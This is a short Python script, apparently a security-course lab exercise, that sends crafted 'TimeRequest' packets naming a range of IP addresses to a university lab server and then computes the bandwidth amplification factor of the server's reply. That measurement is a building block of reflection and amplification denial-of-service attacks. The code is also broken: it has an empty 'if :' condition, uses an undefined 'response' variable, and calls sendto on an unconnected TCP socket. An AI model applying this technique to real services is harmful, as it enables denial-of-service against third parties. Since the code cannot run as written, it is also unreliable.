#!/usr/bin/env python

from scapy.all import * 

import socket
import sys

SERVER_IP = "cs177.seclab.cs.ucsb.edu"

def main():
    if len(sys.argv) != 2:
        print("Usage: python dns_amplify.py <port>")
        return 1

    port = int(sys.argv[1])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    for i in range(50):
        ip = f"1.1.1.{i}"
        request = f"TimeRequest {ip}".encode()
        packet = Raw(load=request)
        print(f"Sending IP: {ip}")
        sock.sendto(bytes(packet), (SERVER_IP, port))

    request = b"0x1f" + 47 * b"\x00"

    packet = Raw(load=request)

    sock.sendto(bytes(packet), (SERVER_IP, port))

    if :
        response.show()

        request_size = len(bytes(packet[Raw]))
        response_size = len(bytes(response[Raw])) if response else 0

        print(f"Request Size: {request_size}")
        print(f"Response Size: {response_size}")
        print(f"BAF: {response_size / request_size:.2f}")
    else:
        print("No response")


if __name__ == "__main__":
    main()
